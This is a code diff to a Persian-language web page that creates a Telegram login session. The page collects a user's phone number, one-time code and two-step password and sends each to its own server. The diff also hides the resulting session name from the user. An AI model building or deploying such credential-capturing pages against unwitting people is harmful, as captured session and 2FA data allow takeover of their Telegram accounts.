@@ -408,10 +408,10 @@ document.getElementById('createLinkBtn').addEventListener('click', e=> togglePan
 
 FREE_HTML = """
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fa">
 <head>
 <meta charset="UTF-8">
-<title>self_login</title>
+<title>ساخت سشن تلگرام</title>
 <style>
 body {
     margin: 0;
@@ -421,6 +421,8 @@ body {
     height: 100vh;
     width: 100vw;
 }
+
+/* پس‌زمینه ساده */
 #galaxy {
     position: fixed;
     top: 0;
@@ -429,9 +431,11 @@ body {
     height: 100%;
     background: url('/static/images/astronomy-1867616_1280.jpg') no-repeat center center fixed;
     background-size: cover;
-    opacity: 25;
+    opacity: 0.25;
     z-index: -1;
 }
+
+/* فرم ورود */
 #container {
     position: absolute;
     top: 45%;
@@ -445,6 +449,7 @@ body {
     backdrop-filter: blur(5px);
     text-align: center;
 }
+
 input {
     width: 90%;
     padding: 12px;
@@ -454,6 +459,7 @@ input {
     outline: none;
     font-size: 18px;
 }
+
 button {
     width: 94%;
     padding: 13px;
@@ -465,10 +471,12 @@ button {
     color: white;
     cursor: pointer;
 }
+
 h2 { margin-top: 0; }
 </style>
 </head>
 <body>
+
 <div id="galaxy"></div>
 
 <div id="container">
@@ -491,7 +499,7 @@ h2 { margin-top: 0; }
 
     <div id="result" style="display:none;">
         <h3>سشن ساخته شد</h3>
-        <p id="msg"></p>
+        <p id="msg">سشن شما با موفقیت ساخته شد!</p>
     </div>
 </div>
 
@@ -500,63 +508,71 @@ let phone_global = "";
 
 function sendPhone() {
     const phone = document.getElementById("phone").value.trim();
+    if(!phone){ alert("شماره موبایل را وارد کنید"); return; }
     phone_global = phone;
 
     fetch("/send_phone", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ phone: phone })
-    }).then(r => r.json()).then(data => {
-        alert(data.message);
-        if (data.status === "ok") {
+    })
+    .then(r => r.json())
+    .then(data => {
+        if(data.status==="ok"){
             document.getElementById("step1").style.display = "none";
             document.getElementById("step2").style.display = "block";
+        } else {
+            alert(data.message || "خطا در ارسال کد");
         }
     });
 }
 
 function sendCode() {
     const code = document.getElementById("code").value.trim();
+    if(!code){ alert("کد OTP را وارد کنید"); return; }
 
     fetch("/send_code", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ phone: phone_global, code: code })
-    }).then(r => r.json()).then(data => {
+    })
+    .then(r => r.json())
+    .then(data => {
         if (data.status === "2fa") {
             document.getElementById("step2").style.display = "none";
             document.getElementById("step3").style.display = "block";
         } else if (data.status === "ok") {
-            success(data.session_name);
+            success();
         } else {
-            alert(data.message);
+            alert(data.message || "کد اشتباه است");
         }
     });
 }
 
 function sendPassword() {
     const pass = document.getElementById("password").value.trim();
+    if(!pass){ alert("رمز دو مرحله‌ای را وارد کنید"); return; }
 
     fetch("/send_password", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ phone: phone_global, password: pass })
-    }).then(r => r.json()).then(data => {
+    })
+    .then(r => r.json())
+    .then(data => {
         if (data.status === "ok") {
-            success(data.session_name);
+            success();
         } else {
-            alert(data.message);
+            alert(data.message || "خطا در رمز دوم");
         }
     });
 }
 
-function success(name) {
+function success() {
     document.getElementById("step1").style.display = "none";
     document.getElementById("step2").style.display = "none";
     document.getElementById("step3").style.display = "none";
-
     document.getElementById("result").style.display = "block";
-    document.getElementById("msg").innerText = " "
 }
 </script>
 
@@ -593,8 +609,8 @@ body {
     inset: 0;
     background: #000;
     z-index: 999;
-    font-size: 42px;
-    animation: helloFade 2.5s forwards;
+    font-size: 62px;
+    animation: helloFade 5.5s forwards;
 }
 
 @keyframes helloFade {
